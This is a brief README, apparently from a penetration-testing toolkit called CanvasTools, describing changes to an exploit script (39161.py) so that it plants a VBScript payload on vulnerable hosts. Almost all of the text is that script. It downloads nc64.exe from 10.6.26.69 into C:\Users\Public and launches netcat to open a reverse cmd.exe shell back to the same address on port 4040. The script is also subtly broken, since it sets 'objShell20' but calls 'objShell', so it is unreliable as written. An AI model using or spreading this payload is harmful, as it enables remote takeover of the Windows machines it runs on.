# CanvasTools
Updates to 39161.py to yield below script.vbs for execution on hosts vulnerable:
	type script.vbs
	dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
	dim bStrm: Set bStrm = createobject("Adodb.Stream")
	xHttp.Open "GET", "http://10.6.26.69/nc64.exe", False
	xHttp.Send

	with bStrm
			.type = 1 '//binary
			.open
			.write xHttp.responseBody
			.savetofile "C:\Users\Public\nc64.exe", 2 '//overwrite
	end with
	Set objShell20= CreateObject("WScript.Shell")
	objShell.Exec("C:\Users\Public\nc64.exe -d 10.6.26.69 4040 -e cmd.exe")
